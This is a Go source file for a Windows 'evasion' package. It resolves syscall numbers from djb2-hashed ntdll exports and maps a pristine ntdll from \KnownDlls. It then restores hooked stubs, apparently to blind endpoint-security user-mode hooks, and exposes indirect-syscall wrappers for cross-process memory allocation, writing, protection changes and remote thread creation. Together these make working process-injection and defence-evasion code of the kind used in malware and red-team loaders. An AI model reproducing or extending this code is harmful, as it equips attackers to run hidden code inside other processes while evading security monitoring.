//go:build windows && amd64

// Package evasion provides indirect syscall machinery: SSN resolution from a
// clean ntdll copy mapped out of \KnownDlls (with a live-scan fallback) and
// typed Nt* wrappers that execute the syscalls directly, bypassing
// user-mode API hooks.
package evasion

import (
	"errors"
	"fmt"
	"sync"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

const (
	hashNtOpenSection        uint32 = 0x4E8F13AE
	hashNtMapViewOfSection   uint32 = 0x873F020A
	hashNtUnmapViewOfSection uint32 = 0xBBB10D4D
	hashNtClose              uint32 = 0x2D18BB7D
	hashNtOpenProcess        uint32 = 0x86C330B8
	hashNtAllocateVM         uint32 = 0xC66D2FCC
	hashNtFreeVM             uint32 = 0xF429F469
	hashNtWriteVM            uint32 = 0x1423FC12
	hashNtProtectVM          uint32 = 0x191EC748
	hashNtCreateThreadEx     uint32 = 0x41F2B1B0
	hashNtWaitForSingleObj   uint32 = 0x5B5856DC
	hashNtQueryInfoThread    uint32 = 0xA1B8991B
)

const (
	memCommitReserve = 0x3000
	memRelease       = 0x8000
	pageReadWrite    = 0x04
	pageExecuteRead  = 0x20
	pageReadOnly     = 0x02
	procAllAccess    = 0x001FFFFF
	threadAllAccess  = 0x001FFFFF
	sectionMapRead   = 0x0004
	viewShare        = 1

	// CurrentProcess is the pseudo-handle for the calling process.
	CurrentProcess uintptr = ^uintptr(0)
)

var (
	sysOnce    sync.Once
	sysTbl     sysTable
	sysErr     error
	unhooked   int
	cleanNtdll uintptr
)

type sysTable struct {
	openSection, mapView, unmapView, closeHandle     uint32
	openProcess, allocVM, freeVM, writeVM, protectVM uint32
	createThreadEx, waitSingle, queryThread          uint32
}

type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type objectAttributes struct {
	Length             uint32
	RootDirectory      uintptr
	ObjectName         *unicodeString
	Attributes         uint32
	SecurityDescriptor uintptr
	SecurityQoS        uintptr
}

type threadBasicInfo struct {
	ExitStatus     int32
	TebBaseAddress uintptr
	UniqueProcess  uintptr
	UniqueThread   uintptr
	AffinityMask   uintptr
	Priority       int32
	BasePriority   int32
}

func initSys() error {
	sysOnce.Do(func() { sysErr = resolve() })
	return sysErr
}

// invokeSyscall executes the syscall directly; implemented in syscall_amd64.s.
func invokeSyscall(ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr

// call is a trampoline into the syscall; the syscall instruction reads args
// 5..11 from the stack, so all slots are passed.
func call(ssn uint32, a ...uintptr) uintptr {
	var v [11]uintptr
	copy(v[:], a)
	return invokeSyscall(uintptr(ssn), v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7], v[8], v[9], v[10])
}

func resolve() error {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandleW := k32.NewProc("GetModuleHandleW")
	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	liveBase, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if liveBase == 0 {
		return errors.New("evasion: GetModuleHandleW(ntdll.dll) failed")
	}

	var boot sysTable
	var ok bool
	if boot.openSection, ok = resolveSSN(toPtr(liveBase), hashNtOpenSection); !ok {
		return errors.New("evasion: resolve NtOpenSection failed")
	}
	if boot.mapView, ok = resolveSSN(toPtr(liveBase), hashNtMapViewOfSection); !ok {
		return errors.New("evasion: resolve NtMapViewOfSection failed")
	}
	if boot.unmapView, ok = resolveSSN(toPtr(liveBase), hashNtUnmapViewOfSection); !ok {
		return errors.New("evasion: resolve NtUnmapViewOfSection failed")
	}
	if boot.closeHandle, ok = resolveSSN(toPtr(liveBase), hashNtClose); !ok {
		return errors.New("evasion: resolve NtClose failed")
	}

	clean, release, cerr := mapCleanNtdll(boot)
	if cerr == nil {
		full, ferr := fillTable(toPtr(clean))
		if ferr == nil {
			full.openSection = boot.openSection
			full.mapView = boot.mapView
			full.unmapView = boot.unmapView
			full.closeHandle = boot.closeHandle
			sysTbl = full
			// The environment rejects a second KnownDlls mapping per
			// process, so the clean copy is retained for the life of the
			// process (UDRL keeps a pristine ntdll resident anyway).
			cleanNtdll = clean
			unhooked = unhookStubs(toPtr(liveBase), toPtr(clean), tableHashes())
			return nil
		}
		release()
	}

	full, ferr := fillTable(toPtr(liveBase))
	if ferr != nil {
		return ferr
	}
	full.openSection = boot.openSection
	full.mapView = boot.mapView
	full.unmapView = boot.unmapView
	full.closeHandle = boot.closeHandle
	sysTbl = full
	return nil
}

func fillTable(src unsafe.Pointer) (sysTable, error) {
	var t sysTable
	var ok bool
	var err error
	if t.openProcess, ok = resolveSSN(src, hashNtOpenProcess); !ok {
		err = errors.New("evasion: resolve NtOpenProcess failed")
	} else if t.allocVM, ok = resolveSSN(src, hashNtAllocateVM); !ok {
		err = errors.New("evasion: resolve NtAllocateVirtualMemory failed")
	} else if t.freeVM, ok = resolveSSN(src, hashNtFreeVM); !ok {
		err = errors.New("evasion: resolve NtFreeVirtualMemory failed")
	} else if t.writeVM, ok = resolveSSN(src, hashNtWriteVM); !ok {
		err = errors.New("evasion: resolve NtWriteVirtualMemory failed")
	} else if t.protectVM, ok = resolveSSN(src, hashNtProtectVM); !ok {
		err = errors.New("evasion: resolve NtProtectVirtualMemory failed")
	} else if t.createThreadEx, ok = resolveSSN(src, hashNtCreateThreadEx); !ok {
		err = errors.New("evasion: resolve NtCreateThreadEx failed")
	} else if t.waitSingle, ok = resolveSSN(src, hashNtWaitForSingleObj); !ok {
		err = errors.New("evasion: resolve NtWaitForSingleObject failed")
	} else if t.queryThread, ok = resolveSSN(src, hashNtQueryInfoThread); !ok {
		err = errors.New("evasion: resolve NtQueryInformationThread failed")
	}
	return t, err
}

// mapCleanNtdll maps a pristine ntdll.dll image from \KnownDlls and returns
// its base address plus a release func that unmaps and closes the section.
func mapCleanNtdll(boot sysTable) (uintptr, func(), error) {
	u16 := utf16.Encode([]rune(`\KnownDlls\ntdll.dll`))
	u := &unicodeString{
		Buffer:        &u16[0],
		Length:        uint16(len(u16) * 2),
		MaximumLength: uint16(len(u16)*2 + 2),
	}
	oa := &objectAttributes{
		Length:     uint32(unsafe.Sizeof(objectAttributes{})),
		ObjectName: u,
	}
	var sec uintptr
	if st := call(boot.openSection, uintptr(unsafe.Pointer(&sec)), sectionMapRead, uintptr(unsafe.Pointer(oa))); int32(uint32(st)) < 0 {
		return 0, nil, fmt.Errorf("evasion: NtOpenSection: 0x%08X", uint32(st))
	}
	var base uintptr
	var viewSize uintptr
	if st := call(boot.mapView, sec, CurrentProcess, uintptr(unsafe.Pointer(&base)), 0, 0, 0, uintptr(unsafe.Pointer(&viewSize)), viewShare, 0, pageReadOnly); int32(uint32(st)) < 0 {
		call(boot.closeHandle, sec)
		return 0, nil, fmt.Errorf("evasion: NtMapViewOfSection: 0x%08X", uint32(st))
	}
	return base, func() {
		call(boot.unmapView, CurrentProcess, base)
		call(boot.closeHandle, sec)
	}, nil
}

// resolveSSN locates the function for the djb2-hashed name and extracts its
// syscall number from the stub bytes (B8 imm32 ... 0F 05), scanning backwards
// past any detour JMP.
func resolveSSN(base unsafe.Pointer, want uint32) (uint32, bool) {
	fn, err := resolveExport(base, want)
	if err != nil {
		return 0, false
	}
	for i := 0; i < 0x40; i++ {
		if rd8(unsafe.Add(fn, i)) == 0x0F && rd8(unsafe.Add(fn, i+1)) == 0x05 {
			start := i - 16
			if start < 0 {
				start = 0
			}
			for j := i - 1; j >= start; j-- {
				if rd8(unsafe.Add(fn, j)) == 0xB8 && j+4 < i {
					return rd32(unsafe.Add(fn, uintptr(j+1))), true
				}
			}
		}
	}
	return 0, false
}

// OpenProcess opens a handle to the target process with PROCESS_ALL_ACCESS.
func OpenProcess(pid uint32) (uintptr, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	oa := &objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}
	cid := &clientID{UniqueProcess: uintptr(pid)}
	var h uintptr
	if st := call(sysTbl.openProcess, uintptr(unsafe.Pointer(&h)), procAllAccess, uintptr(unsafe.Pointer(oa)), uintptr(unsafe.Pointer(cid))); int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtOpenProcess: 0x%08X", uint32(st))
	}
	return h, nil
}

// AllocateVirtualMemory reserves and commits memory in the target process.
func AllocateVirtualMemory(process, size uintptr, protect uint32) (uintptr, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	var base uintptr
	regionSize := size
	if st := call(sysTbl.allocVM, process, uintptr(unsafe.Pointer(&base)), 0, uintptr(unsafe.Pointer(&regionSize)), memCommitReserve, uintptr(protect)); int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtAllocateVirtualMemory: 0x%08X", uint32(st))
	}
	return base, nil
}

// FreeVirtualMemory releases memory in the target process.
func FreeVirtualMemory(process, base uintptr) error {
	if err := initSys(); err != nil {
		return err
	}
	var b = base
	var size uintptr
	if st := call(sysTbl.freeVM, process, uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&size)), memRelease); int32(uint32(st)) < 0 {
		return fmt.Errorf("evasion: NtFreeVirtualMemory: 0x%08X", uint32(st))
	}
	return nil
}

// WriteVirtualMemory copies data into the target process.
func WriteVirtualMemory(process, base uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	if err := initSys(); err != nil {
		return err
	}
	var written uintptr
	if st := call(sysTbl.writeVM, process, base, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), uintptr(unsafe.Pointer(&written))); int32(uint32(st)) < 0 {
		return fmt.Errorf("evasion: NtWriteVirtualMemory: 0x%08X", uint32(st))
	}
	return nil
}

// ProtectVirtualMemory changes page protection and returns the old value.
func ProtectVirtualMemory(process, base, size uintptr, protect uint32) (uint32, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	var b = base
	var s = size
	var old uint32
	if st := call(sysTbl.protectVM, process, uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&s)), uintptr(protect), uintptr(unsafe.Pointer(&old))); int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtProtectVirtualMemory: 0x%08X", uint32(st))
	}
	return old, nil
}

// CreateThreadEx starts a thread in the target process.
func CreateThreadEx(process, start, arg uintptr) (uintptr, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	oa := &objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}
	var h uintptr
	if st := call(sysTbl.createThreadEx, uintptr(unsafe.Pointer(&h)), threadAllAccess, uintptr(unsafe.Pointer(oa)), process, start, arg, 0, 0, 0, 0, 0); int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtCreateThreadEx: 0x%08X", uint32(st))
	}
	return h, nil
}

// WaitForSingleObject waits on a handle; timeoutMs 0 means infinite.
// Returns the wait status (0 = signaled, 0x102 = timed out).
func WaitForSingleObject(handle uintptr, timeoutMs uint32) (uint32, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	var timeout int64
	tp := (*int64)(nil)
	if timeoutMs > 0 {
		timeout = -int64(timeoutMs) * 10000
		tp = &timeout
	}
	st := call(sysTbl.waitSingle, handle, 0, uintptr(unsafe.Pointer(tp)))
	if int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtWaitForSingleObject: 0x%08X", uint32(st))
	}
	return uint32(st), nil
}

// QueryThreadExitCode reads the thread's exit status via
// ThreadBasicInformation.
func QueryThreadExitCode(handle uintptr) (uint32, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	var info threadBasicInfo
	var retLen uint32
	if st := call(sysTbl.queryThread, handle, 0, uintptr(unsafe.Pointer(&info)), uintptr(unsafe.Sizeof(info)), uintptr(unsafe.Pointer(&retLen))); int32(uint32(st)) < 0 {
		return 0, fmt.Errorf("evasion: NtQueryInformationThread: 0x%08X", uint32(st))
	}
	return uint32(info.ExitStatus), nil
}

// Close closes a kernel handle.
func Close(handle uintptr) error {
	if err := initSys(); err != nil {
		return err
	}
	if st := call(sysTbl.closeHandle, handle); int32(uint32(st)) < 0 {
		return fmt.Errorf("evasion: NtClose: 0x%08X", uint32(st))
	}
	return nil
}

// tableHashes lists every export the syscall table resolves, in canonical
// resolution order; used by the UDRL pass.
func tableHashes() []uint32 {
	return []uint32{
		hashNtOpenSection, hashNtMapViewOfSection, hashNtUnmapViewOfSection,
		hashNtClose, hashNtOpenProcess, hashNtAllocateVM, hashNtFreeVM,
		hashNtWriteVM, hashNtProtectVM, hashNtCreateThreadEx,
		hashNtWaitForSingleObj, hashNtQueryInfoThread,
	}
}

// DiagUnhook reports how many live ntdll stub prologues were restored from
// the clean copy (0 means the live image already matched disk).
func DiagUnhook() (int, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	return unhooked, nil
}

// DiagCleanBase returns the retained pristine ntdll mapping, or 0 if the
// clean-copy path was unavailable.
func DiagCleanBase() (uintptr, error) {
	if err := initSys(); err != nil {
		return 0, err
	}
	return cleanNtdll, nil
}

// DiagSSN returns the resolved syscall table for diagnostics.
func DiagSSN() (map[string]uint32, error) {
	if err := initSys(); err != nil {
		return nil, err
	}
	return map[string]uint32{
		"NtOpenSection":            sysTbl.openSection,
		"NtMapViewOfSection":       sysTbl.mapView,
		"NtUnmapViewOfSection":     sysTbl.unmapView,
		"NtClose":                  sysTbl.closeHandle,
		"NtOpenProcess":            sysTbl.openProcess,
		"NtAllocateVirtualMemory":  sysTbl.allocVM,
		"NtFreeVirtualMemory":      sysTbl.freeVM,
		"NtWriteVirtualMemory":     sysTbl.writeVM,
		"NtProtectVirtualMemory":   sysTbl.protectVM,
		"NtCreateThreadEx":         sysTbl.createThreadEx,
		"NtWaitForSingleObject":    sysTbl.waitSingle,
		"NtQueryInformationThread": sysTbl.queryThread,
	}, nil
}
